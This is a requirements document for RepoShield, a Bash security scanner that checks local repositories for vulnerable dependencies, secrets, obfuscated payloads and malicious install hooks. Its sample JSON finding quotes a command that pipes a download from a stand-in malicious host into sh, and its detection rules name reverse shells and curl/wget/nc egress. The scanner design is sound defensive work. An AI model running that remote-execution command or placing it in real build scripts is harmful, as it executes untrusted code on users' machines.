# Technical Requirement Document (TRD)

## Project Name: `RepoShield` — Local Repository Security & Threat Scanner

**Document Version:** 1.0

**Target Platform:** Unix CLI (macOS / Linux)

**Distribution Channel:** Homebrew (`brew install your-org/tap/repo-shield`)

---

## 1. System Overview & Architecture

`RepoShield` is a lightweight, local security CLI scanner designed to inspect cloned software repositories on a user's filesystem for supply chain vulnerabilities, embedded malicious code, credential leaks, and high-risk build/installation scripts.

The system is delivered as a modular Bash CLI that integrates with native system tools (`jq`, `curl`, `grep`, `find`) and optional static-analysis binaries (`yara`, `semgrep`).

```
+-----------------------------------------------------------------------------------+
|                                 INGESTION ENGINE                                  |
|   - Path Resolution (Absolute / Relative)                                         |
|   - Filter Engine (.gitignore, .repo-shield-ignore, node_modules, .git)           |
+-----------------------------------------------------------------------------------+
                                         |
                                         v
+-----------------------------------------------------------------------------------+
|                             DISPATCHER / CLASSIFIER                               |
|   Categorizes target files into Manifests, Source Code, and Lifecycle Scripts     |
+-----------------------------------------------------------------------------------+
                                         |
          +------------------------------+------------------------------+
          |                              |                              |
          v                              v                              v
+--------------------+        +--------------------+        +--------------------+
|    SCA Engine      |        |    SAST Engine     |        |  Lifecycle Engine  |
| - Manifest Parsers |        | - AST / Regex      |        | - Hook Extraction  |
| - OSV Batch API    |        | - YARA Signatures  |        | - Network Call     |
|   Normalization    |        | - Entropy Check    |        |   Detection        |
+--------------------+        +--------------------+        +--------------------+
          |                              |                              |
          +------------------------------+------------------------------+
                                         |
                                         v
+-----------------------------------------------------------------------------------+
|                           AGGREGATION & REPORT ENGINE                             |
|   - Severity Normalization (CRITICAL, HIGH, MEDIUM, LOW)                          |
|   - Formats: ANSI Color Table / JSON / SARIF 2.1.0                                |
|   - CI Pipeline Exit Code Management                                              |
+-----------------------------------------------------------------------------------+

```

---

## 2. Functional Requirements

### 2.1 Target File Traversal & Filtering

- **Path Parsing:** Must accept valid directory paths on the local filesystem (e.g., `.`, `./relative/path`, `/absolute/path`).
- **Ignore Processing:** Automatically ignore deep build and vendor trees (`.git/`, `node_modules/`, `.venv/`, `vendor/`, `target/`, `dist/`) to optimize speed and reduce false positives.
- **Respect Local Ignores:** Parse and apply patterns from `.gitignore` and `.repo-shield-ignore` files located inside the scanned repository.

### 2.2 Software Composition Analysis (SCA)

- **Polyglot Ecosystem Parsing:**
- **JavaScript/TypeScript:** `package.json`, `package-lock.json`
- **Java/JVM:** `pom.xml`, Maven `dependency:list` exports
- **Python:** `Pipfile.lock`, `requirements.txt`

- **Advisory Synchronization:** Batch query package names and versions against the OpenSSF OSV REST API (`[https://api.osv.dev/v1/querybatch](https://api.osv.dev/v1/querybatch)`).
- **Supply Chain Anomalies:** Detect typosquatting indicators, missing locks, and public/private dependency confusion risks.

### 2.3 Malicious Code & Pattern Detection (SAST)

- **Obfuscation Detection:** Flag Base64 / Hex encoded payloads combined with dynamic execution sinks (`eval()`, `Function()`, `exec()`, `vm.runInNewContext()`).
- **Backdoors & Reverse Shells:** Identify socket connections binding shell binaries (`/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`) to remote hosts.
- **Secret Detection:** Scan source code for high-entropy strings, private SSH keys, and un-redacted API credentials.
- **Optional Engine Integration:** Leverage `yara` and `semgrep` CLI binaries if detected on the host machine environment.

### 2.4 Lifecycle Script & Build Hook Analysis

- **Static Hook Extraction:** Parse package configuration files to extract pre/post lifecycle hooks:
- Node.js: `preinstall`, `postinstall`, `prepare`
- Python: `setup.py` / `setup.cfg` inline executions
- Rust / C++: `build.rs` or Makefile scripts

- **Heuristic Threat Detection:** Flag hooks attempting network egress (`curl`, `wget`, `fetch`, `nc`), binary executions (`/bin/sh`), or file system traversal beyond project boundaries.

---

## 3. Non-Functional Requirements

| Metric            | Target Requirement                                                                                                           |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **Performance**   | Repositories < 100MB processed under 10 seconds.                                                                             |
| **Dependencies**  | Hard requirements limited to POSIX utilities, `jq`, and `curl`.                                                              |
| **Exit Codes**    | Exit `0` for clean scans; Exit `1` on critical threat detection (when `--fail-on-critical` is set) or invalid CLI arguments. |
| **Distribution**  | Fully packaged as a Homebrew Formula with automated version updates.                                                         |
| **Compatibility** | macOS (Intel / Apple Silicon) and Linux (Ubuntu, Debian, RHEL, Fedora).                                                      |

---

## 4. Interface Specifications (CLI & Data Structures)

### 4.1 CLI Interface Specification

```bash
repo-shield [OPTIONS] <path-to-repository>

Options:
    -f, --format <table|json|sarif>   Output format (Default: table)
    -o, --output <file>               Write findings to output file
    --fail-on-critical                Exit with code 1 if critical threats are found
    -h, --help                        Show help message
    -v, --version                     Show scanner version

```

### 4.2 Standardized Finding Schema (JSON)

```json
{
  "target_directory": "/Users/developer/projects/sample-app",
  "total_findings": 2,
  "critical_findings": 1,
  "findings": [
    {
      "category": "MALICIOUS_BUILD_HOOK",
      "severity": "CRITICAL",
      "file": "package.json",
      "description": "Postinstall script executes dynamic network call: curl -s http://malicious.com | sh"
    },
    {
      "category": "VULNERABLE_DEPENDENCY",
      "severity": "HIGH",
      "file": "package-lock.json",
      "description": "Dependency 'lodash@4.17.15' affected by advisory GHSA-35jh-f384-659f"
    }
  ]
}
```

---

## 5. Homebrew Distribution Model

`RepoShield` is distributed via a custom Homebrew tap (`your-org/homebrew-tap`).

### Homebrew Formula Definition (`repo-shield.rb`)

```ruby
class RepoShield < Formula
  desc "Local repository threat scanner for malicious code, dependencies, and build hooks"
  homepage "https://github.com/charlesinto/RepoShield"
  url "https://github.com/your-org/repo-shield/archive/refs/tags/v1.0.0.tar.gz"
  sha256 "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
  license "MIT"

  depends_on "jq"
  depends_on "curl"
  depends_on "yara" => :optional
  depends_on "semgrep" => :optional

  def install
    bin.install "repo-shield"
  end

  test do
    assert_match "RepoShield Security Scanner", shell_output("#{bin}/repo-shield --help")
  end
end

```

---

## 6. Implementation & Rollout Roadmap

1. **Core Shell Engine & Ignored Paths Parser:** Phase 1.
   Build CLI argument processing, path traversal logic, and ignore list resolution (`.gitignore`, `.repo-shield-ignore`).

2. **Multi-Ecosystem SCA & OSV Batch Integration:** Phase 2.
   Implement parsers for `package-lock.json`, `pom.xml`, and `Pipfile.lock` with curl/jq payloads for OSV batch queries.

3. **Static Code & Build Hook Analysis Engine:** Phase 3.
   Add regex and YARA/Semgrep hooks to detect obfuscated payloads, reverse shells, and malicious `postinstall` commands.

4. **Homebrew Packaging & CI/CD Release Automation:** Phase 4.
   Publish `repo-shield.rb` formula into the Homebrew tap and setup GitHub Actions for automated releases.
